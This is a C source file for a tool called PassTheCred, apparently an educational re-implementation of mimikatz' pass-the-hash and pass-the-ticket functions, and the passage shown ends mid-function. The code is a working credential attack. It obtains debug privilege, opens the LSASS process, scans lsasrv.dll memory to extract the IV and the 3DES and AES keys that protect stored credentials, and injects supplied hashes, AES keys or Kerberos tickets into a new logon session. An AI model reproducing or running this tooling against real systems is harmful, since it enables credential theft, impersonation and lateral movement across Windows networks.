#include "PassTheCred.h"

// This code is written to be read top-down.

int wmain(int argc, wchar_t *argv[])
{
    PrintHeader();

    OsVersionCompatibilityCheck();

    PrivilegeSeDebug();

    ARGUMENTS arguments = ParseArguments(argc, argv);

    RunProcessWithCreds(&arguments);

    return STATUS_SUCCESS;
}

// A note regarding API choice in this implementation:
// Mimikatz directly uses quite a few native APIs / syscalls in ntdll, some of
// them undocumented. While this is stealthier (fewer imports) and therefore
// better in a real-world setting, it also sometimes makes the code more
// verbose and harder to read/follow. For clarity, in this project sometimes I
// choose to adhere to documented WinAPI functions.

// A note regarding error handling in this implementation: There is none.
// Errors are (mostly) checked, but if we detect that something is wrong we
// just bail out and exit the program without any cleanup.

VOID PrintHeader()
{
    // clang-format off
    wprintf(L" +------------------------------------------------------------------------------------------------------+ \n");
    wprintf(L"/  888888ba                             d888888P dP                 a88888b.                         dP  \\\n");
    wprintf(L"|  88    `8b                               88    88                d8'   `88                         88  |\n");
    wprintf(L"| a88aaaa8P' .d8888b. .d8888b. .d8888b.    88    88d888b. .d8888b. 88        88d888b. .d8888b. .d888b88  |\n");
    wprintf(L"|  88        88'  `88 Y8ooooo. Y8ooooo.    88    88'  `88 88ooood8 88        88'  `88 88ooood8 88'  `88  |\n");
    wprintf(L"|  88        88.  .88       88       88    88    88    88 88.  ... Y8.   .88 88       88.  ... 88.  .88  |\n");
    wprintf(L"|  dP        `88888P8 `88888P' `88888P'    dP    dP    dP `88888P'  Y88888P' dP       `88888P' `88888P8  |\n");
    wprintf(L"\\                                                                                                        /\n");
    wprintf(L" +------------------------------------------------------------------------------------------------------+ \n");
    wprintf(L"\n");
    wprintf(L" Version git commit %s\n",
            PASS_THE_CRED_GIT_COMMIT);
    wprintf(L"\n");
    wprintf(L" Limited standalone re-implementation of mimikatz' sekurlsa::pth and kerberos::ptt\n");
    wprintf(L"\n");
    wprintf(L" By stfnw\n");
    wprintf(L"\n");
    wprintf(L"\n");
    // clang-format on
}

// Exit if this OS is not supported; e.g. only 64 bit.
VOID OsVersionCompatibilityCheck()
{
    DWORD majorVersion = 0, minorVersion = 0, buildNumber = 0;
    RtlGetNtVersionNumbers(&majorVersion, &minorVersion, &buildNumber);
    buildNumber &= 0x7fff;

    LogInfo("OS Version information : major (%lu), minor (%lu), build number (%lu)\n", majorVersion, minorVersion,
            buildNumber);

    // This tool only implements the logic for NT6, not NT5; in mimikatz this
    // switch is assigned in the global variable lsassLocalHelper in
    // mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c. The relevant functions for
    // NT6-specific functionality are kuhl_m_sekurlsa_nt6_init,
    // kuhl_m_sekurlsa_nt6_clean, kuhl_m_sekurlsa_nt6_acquireKeys,
    // kuhl_m_sekurlsa_nt6_pLsaProtectMemory and
    // kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory, which are themselves
    // implemented in mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
    if (majorVersion < 6)
        LogError("OS Major Version %ld is not supported\n", majorVersion);

    if (buildNumber != 19045)
        LogInfo("This program was only tested to work on Windows 10 Pro (Build 19045)\n");
}

// Obtain SeDebugPrivilege.
VOID PrivilegeSeDebug()
{
    ULONG prevState = 0;
    NTSTATUS status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, // which privilege to modify
                                         TRUE,               // enable the privilege
                                         FALSE,              // perform action on current process, not on different one
                                         &prevState);
    if (!NT_SUCCESS(status))
        LogError("RtlAdjustPrivilege failed with error code : %ld\n"
                 "(this program needs to be run with local administrator privileges)\n",
                 status);
    LogInfo("Obtained SeDebugPrivilege\n");
}

// Parse commandline arguments. `username`, `domain` and `run` are mandatory.
// Also, at least one credential to use has to be specified.
// This code is extracted from kuhl_m_sekurlsa_pth in
// mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c.
// Each of mimikatz' several subcommands performs its own argument parsing.
// Since this tool only supports a very limited subset of mimikatz'
// functionality, I choose to split the argument parsing into its own function.
ARGUMENTS ParseArguments(int argc, wchar_t *argv[])
{
    // Make sure that there is at least one argument present and that the
    // number of total arguments is uneven.
    // This is needed since all arguments are passed in as `<argname>
    // <argvalue>`, and the program name itself is argv[0].
    // Placing this uneven check here allows us to later omit the check each
    // time we want to read the value of a specified argument.
    if (argc <= 1 || (argc == 2 && 0 == wcscmp(argv[1], L"/help")) || argc % 2 != 1)
        PrintUsage(argv[0]);

    ARGUMENTS arguments = {0};

    // Summarize arguments into struct.
    for (int i = 0; i < argc; i++)
    {
        if (0 == wcscmp(argv[i], L"/username"))
            arguments.Account.Username = argv[++i];

        if (0 == wcscmp(argv[i], L"/domain"))
            arguments.Account.Domain = argv[++i];

        if (0 == wcscmp(argv[i], L"/run"))
            arguments.Run = argv[++i];

        if (0 == wcscmp(argv[i], L"/password"))
            arguments.Creds.Password = argv[++i];

        if (0 == wcscmp(argv[i], L"/lmhash"))
        {
            LPCWSTR sLmhash = argv[++i];
            arguments.Creds.Lmhash = LocalAlloc(LPTR, LM_NT_HASH_LENGTH);
            HexStringToBinary(arguments.Creds.Lmhash, sLmhash, LM_NT_HASH_LENGTH);
        }

        if (0 == wcscmp(argv[i], L"/sha1hash"))
        {
            LPCWSTR sSha1hash = argv[++i];
            arguments.Creds.Sha1hash = LocalAlloc(LPTR, SHA_DIGEST_LENGTH);
            HexStringToBinary(arguments.Creds.Sha1hash, sSha1hash, SHA_DIGEST_LENGTH);
        }

        if (0 == wcscmp(argv[i], L"/nthash"))
        {
            LPCWSTR sNthash = argv[++i];
            arguments.Creds.Nthash = LocalAlloc(LPTR, LM_NT_HASH_LENGTH);
            HexStringToBinary(arguments.Creds.Nthash, sNthash, LM_NT_HASH_LENGTH);
        }

        if (0 == wcscmp(argv[i], L"/aes128key"))
        {
            LPCWSTR sAes128key = argv[++i];
            arguments.Creds.Aes128key = LocalAlloc(LPTR, AES_128_KEY_LENGTH);
            HexStringToBinary(arguments.Creds.Aes128key, sAes128key, AES_128_KEY_LENGTH);
        }

        if (0 == wcscmp(argv[i], L"/aes256key"))
        {
            LPCWSTR sAes256key = argv[++i];
            arguments.Creds.Aes256key = LocalAlloc(LPTR, AES_256_KEY_LENGTH);
            HexStringToBinary(arguments.Creds.Aes256key, sAes256key, AES_256_KEY_LENGTH);
        }

        if (0 == wcscmp(argv[i], L"/ticket"))
        {
            LPCWSTR kirbiTicket = argv[++i];
            DWORD nbKirbiTicket = wcslen(kirbiTicket) / 2; // (hex coded)
            arguments.Creds.KirbiTicket = LocalAlloc(LPTR, nbKirbiTicket);
            arguments.Creds.nbKirbiTicket = nbKirbiTicket;
            HexStringToBinary(arguments.Creds.KirbiTicket, kirbiTicket, nbKirbiTicket);
        }
    }

    // Perform further requirement checks on the arguments: these ones are mandatory:
    if (!arguments.Account.Username)
    {
        printf("[!] Parameter username is required.\n");
        PrintUsage(argv[0]);
    }
    if (!arguments.Account.Domain)
    {
        printf("[!] Parameter domain is required.\n");
        PrintUsage(argv[0]);
    }
    if (!arguments.Run)
    {
        printf("[!] Parameter run is required.\n");
        PrintUsage(argv[0]);
    }

    // Perform further requirement checks on the arguments: at least one of these is mandatory:
    if (!arguments.Creds.Password && !arguments.Creds.Lmhash && !arguments.Creds.Sha1hash && !arguments.Creds.Nthash &&
        !arguments.Creds.Aes128key && !arguments.Creds.Aes256key && !arguments.Creds.KirbiTicket)
    {
        printf("[!] At least one credential parameter is required.\n");
        PrintUsage(argv[0]);
    }

    return arguments;
}

// Print usage/help and exit.
VOID PrintUsage(LPCWSTR programName)
{
    printf("Usage: %ls /username <username> /domain <domain>\n", programName);
    printf("                ( /password  <password>  |\n");
    printf("                  /lmhash    <lmhash>    |\n");
    printf("                  /sha1hash  <sha1hash>  |\n");
    printf("                  /nthash    <nthash>    |\n");
    printf("                  /aes128key <aes128key> |\n");
    printf("                  /aes256key <aes256key> |\n");
    printf("                  /ticket    <ticket> )\n");
    printf("           /run <run>\n");
    printf("\n");
    printf("\n");
    printf("    /username  <username>:  Username to impersonate.\n");
    printf("\n");
    printf("    /domain    <domain>:    Fully qualified domain name (FQDN) of the target user.\n");
    printf("                            For local user (without domain): use target computer name or WORKGROUP.\n");
    printf("\n");
    printf("    /password  <password>:  Cleartext password of the target user.\n");
    printf("\n");
    printf("    /lmhash    <lmhash>:    LM hash computed from the target user's password.\n");
    printf("                            (MSV1_0/pass-the-hash)\n");
    printf("\n");
    printf("    /sha1hash  <sha1hash>:  SHA1 hash computed from the target user's password.\n");
    printf("\n");
    printf("    /nthash    <nthash>:    NT hash computed from the target user's password.\n");
    printf("                            (MSV1_0/pass-the-hash, Kerberos/overpass-the-hash)\n");
    printf("\n");
    printf("    /aes128key <aes128key>: AES 128 key computed from the target user's password.\n");
    printf("                            (Kerberos/pass-the-key)\n");
    printf("\n");
    printf("    /aes256key <aes256key>: AES 256 key computed from the target user's password.\n");
    printf("                            (Kerberos/pass-the-key)\n");
    printf("\n");
    printf("    /ticket    <ticket>:    Kerberos ticket (kirbi, ascii hex encoded).\n");
    printf("                            (Kerberos/pass-the-ticket)\n");
    printf("\n");
    printf("    /run <run>              Command line to run.\n");
    printf("\n");
    printf("\n");
    printf("Example call: %ls /username myuser1 /domain mydomain.local /nthash 9957724505bb914366773ea28589bdde /run "
           "powershell.exe\n",
           programName);
    printf("\n");
    exit(EXIT_FAILURE);
}

// Implements main functionality of spawning a new process and possibly
// injecting the provided credentials / secrets into the corresponding memory
// part of the LSASS process.
// Based on kuhl_m_sekurlsa_pth in mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c.
VOID RunProcessWithCreds(PARGUMENTS pArguments)
{
    // Create a new suspended process. Note that mimikatz also supports
    // injecting credentials into an existing process by specifying a luid for
    // the target session. This tools does not support that but instead always
    // starts a new process.
    PROCESS_INFORMATION processInformation = {0};
    WrapCreateProcessWithLogonW(pArguments->Account.Username, pArguments->Account.Domain,
                                !pArguments->Creds.Password ? L"" : pArguments->Creds.Password, pArguments->Run,
                                &processInformation);

    // Obtain token in order to query the luid associated with the newly
    // created process.
    HANDLE hToken = NULL;
    if (!OpenProcessToken(processInformation.hProcess, TOKEN_READ, &hToken))
        LogError("OpenProcessToken failed with error code : %ld\n", GetLastError());

    TOKEN_STATISTICS tokenStats = {0};
    DWORD dwNeededSize = 0;
    if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
        LogError("GetTokenInformation failed with error code : %ld\n", GetLastError());

    // Inject specified credentials (if any). If none were given, just
    // passthrough the password; in that case no injection is necessary since
    // the normal WinAPI CreateProcessWithLogonW can be used without
    // modification.

    if (pArguments->Creds.Sha1hash || pArguments->Creds.Lmhash || pArguments->Creds.Nthash ||
        pArguments->Creds.Aes128key || pArguments->Creds.Aes256key)
        // Inject credentials into the session for this luid.
        InjectCreds(&tokenStats.AuthenticationId, &pArguments->Creds);

    if (pArguments->Creds.KirbiTicket)
        InjectTicket(&tokenStats.AuthenticationId, &pArguments->Creds);

    NtResumeProcess(processInformation.hProcess);
    printf("\n");
    LogInfo("Resumed process\n");

    // Resource cleanup.
    CloseHandle(processInformation.hThread);
    CloseHandle(processInformation.hProcess);
}

// Create new suspended process. Wrapper around CreateProcessWithLogonW with
// the desired flags set. Based on kull_m_process_create in
// modules/kull_m_process.c (case KULL_M_PROCESS_CREATE_LOGON).
VOID WrapCreateProcessWithLogonW(LPCWSTR username, LPCWSTR domain, LPCWSTR password, LPCWSTR _run,
                                 OUT LPPROCESS_INFORMATION lpProcessInformation)
{
    LPWSTR run = _wcsdup(_run);
    if (!run)
        LogError("_wcsdup failed with error code : %ld\n", GetLastError());

    STARTUPINFO startupInfo = {0};
    startupInfo.cb = sizeof(startupInfo); // The size of the structure, in bytes.

    BOOL status = CreateProcessWithLogonW(
        // [in]                LPCWSTR               lpUsername,
        username,
        // [in, optional]      LPCWSTR               lpDomain,
        domain,
        // [in]                LPCWSTR               lpPassword,
        password,
        // [in]                DWORD                 dwLogonFlags,
        // Log on, but use the specified credentials on the network only.
        // This value can be used to create a process that uses a different set
        // of credentials locally than it does remotely.
        LOGON_NETCREDENTIALS_ONLY,
        // [in, optional]      LPCWSTR lpApplicationName,
        // The lpApplicationName parameter can be NULL, and the module name
        // must be the first white space–delimited token in the
        // lpCommandLine string
        NULL,
        // [in, out, optional] LPWSTR                lpCommandLine,
        run,
        // [in]                DWORD                 dwCreationFlags,
        CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
        // [in, optional]      LPVOID                lpEnvironment,
        // If this parameter is NULL, the new process uses an environment
        // created from the profile of the user specified by lpUsername.
        NULL,
        // [in, optional]      LPCWSTR               lpCurrentDirectory,
        // If this parameter is NULL, the new process has the same current
        // drive and directory as the calling process.
        NULL,
        // [in]                LPSTARTUPINFOW        lpStartupInfo,
        &startupInfo,
        // [out]               LPPROCESS_INFORMATION lpProcessInformation
        lpProcessInformation);

    if (!status)
        LogError("CreateProcessWithLogonW failed with error code : %ld\n", GetLastError());
    LogInfo("Started new suspended process with PID %ld\n", lpProcessInformation->dwProcessId);
}

// Injects credentials `pcreds` into the logon session identified by `pluid`.
// Based mainly on kuhl_m_sekurlsa_pth_luid in
// mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c.
VOID InjectCreds(PLUID pluid, PCREDS pcreds)
{
    // Note: since the credentials we want to patch are kept encrypted in
    // memory, we need to implement the same crypto operations as if we would
    // want to dump the credentials. Both authentication-package-specific
    // callbacks for dumping (e.g. kuhl_m_sekurlsa_enum_logon_callback_msv) and
    // patching credentials (e.g. kuhl_m_sekurlsa_enum_callback_msv_pth) are
    // processed via kuhl_m_sekurlsa_msv_enum_cred, which handles decryption
    // and re-encryption.

    // Read crypto material that is needed to then subsequently extract or
    // modify the actual credentials.
    LSASS_CONTEXT lsassInfo = {0};
    LSA_CRYPTO_MATERIAL lsaCrypto = {0};
    AcquireLSA(&lsassInfo, &lsaCrypto);

    // Note that mimikatz in principal supports multiple backing stores for
    // certain operations; these are listed in the enum KULL_M_MEMORY_TYPE in
    // modules/kull_m_memory.h. E.g. dumping credentials is possible from both
    // live memory on the current system, or from a minidump of the LSASS
    // process.
    // Since injecting credentials only makes sense in the context of a
    // running/live system, here only the type KULL_M_MEMORY_TYPE_PROCESS is
    // relevant. Mimikatz checks this is in kuhl_m_sekurlsa.c in line 1015.
    // Since this tool only supports injecting credentials and none of the
    // other mimikatz functions, other code paths in various helper functions
    // are not implemented here, which allows for a simpler software
    // architecture.

    LogInfo("Injecting credentials for session with LUID 0x%lx : 0x%lx\n", pluid->HighPart, pluid->LowPart);

    // Inject the credentials by enumerating all logon sessions and -- for each
    // -- performing the action outlined in the given callback function. Here
    // there are two callback functions: ...

    PTH_CREDS pthCreds = {
        .LsassContext = &lsassInfo,
        .Luid = pluid,
        .Creds = pcreds,
        .LsaCrypto = &lsaCrypto,
    };

    // ... one for MSV1_0 SSP/AP, ...
    if (pcreds->Sha1hash || pcreds->Lmhash || pcreds->Nthash)
    {
        printf("\n");
        LogInfo("Patching MSV1_0 SSP/AP credentials\n");
        LsaEnumLogonSessions(&lsassInfo, CallbackPthMsv, &pthCreds);
    }

    // ... and one for Kerberos SSP/AP.
    if (pcreds->Nthash /* over-pass-the-hash */ || pcreds->Aes128key || pcreds->Aes256key)
    {
        printf("\n");
        LogInfo("Patching Kerberos SSP/AP credentials\n");
        LsaEnumLogonSessions(&lsassInfo, CallbackPthKerberos, &pthCreds);
    }
}

// Get basic information about the LSASS process and some relevant modules
// therein. Also read out the crypto keys needed for subsequent credential
// (de|en)cryption. Based on kuhl_m_sekurlsa_acquireLSA in
// mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c.
VOID AcquireLSA(OUT PLSASS_CONTEXT pCtx, OUT PLSA_CRYPTO_MATERIAL pLsaCrypto)
{
    // Find PID of LSASS process.
    GetProcessPidForName(L"lsass.exe", &pCtx->ProcInfo.Pid);
    LogInfo("Found process lsass.exe with PID %ld\n", pCtx->ProcInfo.Pid);

    // Get access to its memory. Note that mimikatz requests more specific
    // permissions; here we just request full access.
    pCtx->ProcInfo.Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pCtx->ProcInfo.Pid);
    if (!pCtx->ProcInfo.Handle || pCtx->ProcInfo.Handle == INVALID_HANDLE_VALUE)
        LogError("OpenProcess failed with error code : %ld\n", GetLastError());

    // Find module information about relevant dlls in the lsass process, which
    // store the crypto secrets. This line consolidates code that was a bit
    // spread out in mimikatz, due to its generic nature and many supported
    // functions. At this point (line 240ff.) mimikatz also calls
    // `kull_m_process_getVeryBasicModuleInformations` with the callback
    // `kuhl_m_sekurlsa_findlibs` to initialize data for *all* supported
    // security service providers / packages (in `lsassPackages`) and their
    // modules/dlls, since the code path through kuhl_m_sekurlsa_acquireLSA is
    // also used e.g. when dumping credentials.
    // Relevant for injecting credentials is only the module lsasrv where the
    // crypto material is stored, and the modules of the specific SSP/APs:
    //
    //   - MSV1_0 (also lsasrv.dll, see kuhl_m_sekurlsa_msv_package in
    //     mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c),
    //
    //   - and Kerberos (kerberos.dll, see kuhl_m_sekurlsa_kerberos_package in
    //     mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c).

    GetModuleInfoForPidName(pCtx->ProcInfo.Handle, pCtx->ProcInfo.Pid, L"lsasrv.dll", &pCtx->LsaSrvInfo);
    LogInfo("Found module lsasrv.dll :   DllBase 0x%016llx, ImageSize 0x%lx, TimeDateStamp 0x%lx\n",
            (DWORD64)pCtx->LsaSrvInfo.DllBase, pCtx->LsaSrvInfo.ImageSize, pCtx->LsaSrvInfo.TimeDateStamp);

    GetModuleInfoForPidName(pCtx->ProcInfo.Handle, pCtx->ProcInfo.Pid, L"kerberos.dll", &pCtx->KerberosInfo);
    LogInfo("Found module kerberos.dll : DllBase 0x%016llx, ImageSize 0x%lx, TimeDateStamp 0x%lx\n",
            (DWORD64)pCtx->KerberosInfo.DllBase, pCtx->KerberosInfo.ImageSize, pCtx->KerberosInfo.TimeDateStamp);

    // Read out the crypto secrets from the identified lsassrv.dll memory.
    AcquireLsaCryptoMaterial(pCtx, pLsaCrypto);
}

// Get Handle for a given process name. Functionally similar to
// kull_m_process_getProcessIdForName in modules/kull_m_process.c.
VOID GetProcessPidForName(LPCWSTR name, OUT PDWORD pPid)
{
    *pPid = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        LogError("CreateToolhelp32Snapshot failed with error code %ld\n", GetLastError());

    PROCESSENTRY32 entry = {0};
    entry.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnap, &entry))
        LogError("Process32First failed with error code %ld\n", GetLastError());

    do
    {
        if (!_wcsicmp(entry.szExeFile, name))
        {
            *pPid = entry.th32ProcessID;
            return;
        }
    } while (Process32Next(hSnap, &entry));

    CloseHandle(hSnap);

    LogError("Process with name %ls not found\n", name);
}

// Get module information for a module identified by `moduleName` in the
// process identified by `hProc`/`pid`.
// Based on kull_m_process_getVeryBasicModuleInformations in
// modules/kull_m_process.c and the callback function kuhl_m_sekurlsa_findlibs
// in mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c. Since here the code path is
// only used for querying and not for enumeration of modules for performing
// different actions via callbacks, the callback has been directly merged into
// the loop over the modules.
// Mimikatz' implementation manually traverses memory of LSASS (the PEB and
// referenced module lists) to avoid calling any additional API functions.
// For easier demonstration this function performs the same functionality by
// calling documented WinAPI functions.
VOID GetModuleInfoForPidName(HANDLE hProc, DWORD pid, LPCWSTR moduleName, OUT PBASIC_MODULE_INFORMATION pModInfo)
{
    HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hModule == INVALID_HANDLE_VALUE)
        LogError("CreateToolhelp32Snapshot failed with error code : %ld\n", GetLastError());

    MODULEENTRY32 me = {0};
    me.dwSize = sizeof(me);

    if (!Module32First(hModule, &me))
        LogError("Module32First failed with error code : %ld\n", GetLastError());

    BOOL found = FALSE;
    do
    {
        if (!wcsicmp(me.szModule, moduleName))
        {
            found = TRUE;
            pModInfo->DllBase = me.modBaseAddr;
            pModInfo->ImageSize = me.modBaseSize;
            break;
        }
    } while (Module32Next(hModule, &me));

    if (!found)
        LogError("Module32First failed with error code : %ld\n", GetLastError());

    CloseHandle(hModule);

    GetTimeDateStampForModule(hProc, pModInfo->DllBase, &pModInfo->TimeDateStamp);
}

// Extract the timestamp of a module PE binary. This is done by traversing the
// relevant header structures. Based on kull_m_process_adjustTimeDateStamp in
// modules/kull_m_process.c.
VOID GetTimeDateStampForModule(HANDLE hProc, LPBYTE pBase, PULONG pTimeDateStamp)
{
    // get dos header
    IMAGE_DOS_HEADER imageDosHeader = {0};
    if (!ReadProcessMemory(hProc, pBase, &imageDosHeader, sizeof(imageDosHeader), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    if (imageDosHeader.e_magic != IMAGE_DOS_SIGNATURE)
        LogError("IMAGE_DOS_SIGNATURE does not match\n");

    // get nt headers
    IMAGE_NT_HEADERS imageNtHeaders = {0};
    if (!ReadProcessMemory(hProc, pBase + imageDosHeader.e_lfanew, &imageNtHeaders,
                           sizeof(DWORD) + IMAGE_SIZEOF_FILE_HEADER, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    if (imageNtHeaders.Signature != IMAGE_NT_SIGNATURE)
        LogError("IMAGE_NT_SIGNATURE does not match\n");

    if (imageNtHeaders.FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
        LogError("32 bit is not supported\n");

    // extract timestamp
    *pTimeDateStamp = imageNtHeaders.FileHeader.TimeDateStamp;
}

// Wrapper around NtQuerySystemInformation, which requires two subsequent calls ...
VOID WrapNtQuerySystemInformation(OUT PSYSTEM_PROCESS_INFORMATION *ppProcInfo)
{
    DWORD returnedLen = 0;

    // ... the first call to determine the amount of memory to allocate for the
    // resulting SYSTEM_PROCESS_INFORMATION, ...
    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &returnedLen);
    if (STATUS_INFO_LENGTH_MISMATCH != status)
        LogError("NtQuerySystemInformation failed with error code : %ld\n", status);

    *ppProcInfo = LocalAlloc(LPTR, returnedLen);

    // ... and the second call to actually read out the desired information.
    status = NtQuerySystemInformation(SystemProcessInformation, *ppProcInfo, returnedLen, NULL);
    if (!NT_SUCCESS(status))
        LogError("NtQuerySystemInformation failed with error code : %ld\n", status);
}

// Read out crypto material from lsasrv.dll memory.
// Based on lsassLocalHelper->initLocalLib (kuhl_m_sekurlsa_nt6_init) and
// lsassLocalHelper->AcquireKeys (kuhl_m_sekurlsa_nt6_acquireKeys) in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
VOID AcquireLsaCryptoMaterial(IN PLSASS_CONTEXT pLsassInfo, OUT PLSA_CRYPTO_MATERIAL pLsaCryptoMaterial)
{
    PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate = GetLsaMemoryDecryptMemoryTemplate();
    LogInfo("Searching for credential data structure pattern in lsasrv.dll : ");
    PrintBinaryAsHex(pTemplate->Pattern, pTemplate->PatternLength);

    // example run for build 19045: WinDbg output in lsasrv.dll in lsass.exe
    //                     | pattern matches here
    // 00007fff`887b6788 008364243000   add     byte ptr [rbx+302464h], al
    // 00007fff`887b678e 488d45e0       lea     rax, [rbp-20h]

    LPBYTE pLsaKeyStructure = NULL;
    SearchMemory(pLsassInfo->ProcInfo.Handle, pLsassInfo->LsaSrvInfo.DllBase, pLsassInfo->LsaSrvInfo.ImageSize,
                 pTemplate->Pattern, pTemplate->PatternLength, &pLsaKeyStructure);
    printf("    ... Found relevant credential data structure pattern in lsasrv.dll at 0x%016llx\n",
           (DWORD64)pLsaKeyStructure);

    // Extract IV, 3DES key and AES key.
    AcquireLsaCryptoMaterialInitializationVector(pLsassInfo->ProcInfo.Handle, pTemplate, pLsaKeyStructure,
                                                 pLsaCryptoMaterial->InitializationVector);
    AcquireLsaCryptoMaterialKey3Des(pLsassInfo->ProcInfo.Handle, pTemplate, pLsaKeyStructure,
                                    &pLsaCryptoMaterial->Key3Des);
    AcquireLsaCryptoMaterialKeyAes(pLsassInfo->ProcInfo.Handle, pTemplate, pLsaKeyStructure,
                                   &pLsaCryptoMaterial->KeyAes);
}

// Extract initialization vector from memory of lsass.
// Merges functionality from kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory
// and kuhl_m_sekurlsa_nt6_acquireKeys in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
// hLsass: Handle to LSASS process
// pTemplate: describes offsets / structure layout of relevant credentials in LSASS memory
// pLsaKeyStructure: pointer to structure of relevant credentials in LSASS memory
VOID AcquireLsaCryptoMaterialInitializationVector(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate,
                                                  IN LPBYTE pLsaKeyStructure, OUT LPBYTE pInitializationVector)
{
    // Note regarding variable naming: to keep track of where target data of
    // pointers resides (own process or remote process), all pointers into
    // lsass memory (i.e. they cannot be directly referenced but memory must be
    // copied first) are prefixed with pLsa.

    // example run for build 19045: WinDbg output in lsasrv.dll in lsass.exe
    //                     | pattern matches here
    // 00007fff`887b6788 008364243000   add     byte ptr [rbx+302464h], al
    // 00007fff`887b678e 488d45e0       lea     rax, [rbp-20h]
    // ...
    // 00007fff`887b67c6 448bc6         mov     r8d, esi
    // 00007fff`887b67c9 488d15001f1300 lea     rdx, [lsasrv!InitializationVector (7fff888e86d0)]
    //                         |------|  offset 67 extracts this dword
    //
    // 0: kd> dd 00007fff`887b6789+0n67 l1
    // 00007fff`887b67cc  00131f00
    //
    // 0: kd> ln 00007fff`887b6789+0n67+4+00131f00
    // (00007fff`888e86d0)   lsasrv!InitializationVector   |  (00007fff`888e86e0)   lsasrv!hAesKey
    //
    // 0: kd> db 00007fff`887b6789+0n67+4+00131f00 l16
    // 00007fff`888e86d0  d4 d2 21 9d 99 5d af 89-37 9a 48 0e 59 fc 71 d2  ..!..]..7.H.Y.q.

    ULONG offset = 0;
    if (!ReadProcessMemory(hLsass, pLsaKeyStructure + pTemplate->OffsetToInitializationVectorPtr, &offset,
                           sizeof(offset), NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    if (!ReadProcessMemory(hLsass,
                           pLsaKeyStructure + pTemplate->OffsetToInitializationVectorPtr + sizeof(offset) + offset,
                           pInitializationVector, INITIALIZATION_VECTOR_LENGTH, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    printf("    ... Got Initialization Vector at 0x%016llx : ",
           (DWORD64)(pLsaKeyStructure + pTemplate->OffsetToInitializationVectorPtr + sizeof(offset) + offset));
    PrintBinaryAsHex((LPBYTE)pInitializationVector, INITIALIZATION_VECTOR_LENGTH);
}

// Extract 3DES key from memory of lsass.
// Merges functionality from kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory
// and kuhl_m_sekurlsa_nt6_acquireKeys in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
// hLsass: Handle to LSASS process
// pTemplate: describes offsets / structure layout of relevant credentials in LSASS memory
// pLsaKeyStructure: pointer to structure of relevant credentials in LSASS memory
VOID AcquireLsaCryptoMaterialKey3Des(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate,
                                     IN LPBYTE pLsaKeyStructure, OUT PKIWI_BCRYPT_GEN_KEY pKey3Des)
{
    InitLsaCryptoKey3Des(pKey3Des);
    printf("    ... Reading out crypto key for 3DES\n");
    AcquireLsaCryptoMaterialKey(hLsass, pTemplate, pTemplate->OffsetTo3DesKeyPtr, pLsaKeyStructure, pKey3Des);
}

// Extract AES key from memory of lsass.
// Merges functionality from kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory
// and kuhl_m_sekurlsa_nt6_acquireKeys in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
// hLsass: Handle to LSASS process
// pTemplate: describes offsets / structure layout of relevant credentials in LSASS memory
// pLsaKeyStructure: pointer to structure of relevant credentials in LSASS memory
VOID AcquireLsaCryptoMaterialKeyAes(IN HANDLE hLsass, IN PLSA_DECRYPT_MEMORY_TEMPLATE pTemplate,
                                    IN LPBYTE pLsaKeyStructure, OUT PKIWI_BCRYPT_GEN_KEY pKeyAes)
{
    InitLsaCryptoKeyAes(pKeyAes);
    printf("    ... Reading out crypto key for AES\n");
    AcquireLsaCryptoMaterialKey(hLsass, pTemplate, pTemplate->OffsetToAesKeyPtr, pLsaKeyStructure, pKeyAes);
}

// Setup key structure for 3DES key.
// Based on kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory in
// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c.
VOID InitLsaCryptoKey3Des(OUT PKIWI_BCRYPT_GEN_KEY pKey)
{
    NTSTATUS status = BCryptOpenAlgorithmProvider(&pKey->hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptOpenAlgorithmProvider 3DES failed with error code : %ld\n", status);

    status = BCryptSetProperty(pKey->hProvider, BCRYPT_CHAINING_MODE, (LPBYTE)BCRYPT_CHAIN_MODE_CBC,
                               sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptSetProperty 3DES failed with error code : %ld\n", status);

    ULONG dwSizeNeeded = 0;
    status = BCryptGetProperty(pKey->hProvider, BCRYPT_OBJECT_LENGTH, (LPBYTE)&pKey->cbKey, sizeof(pKey->cbKey),
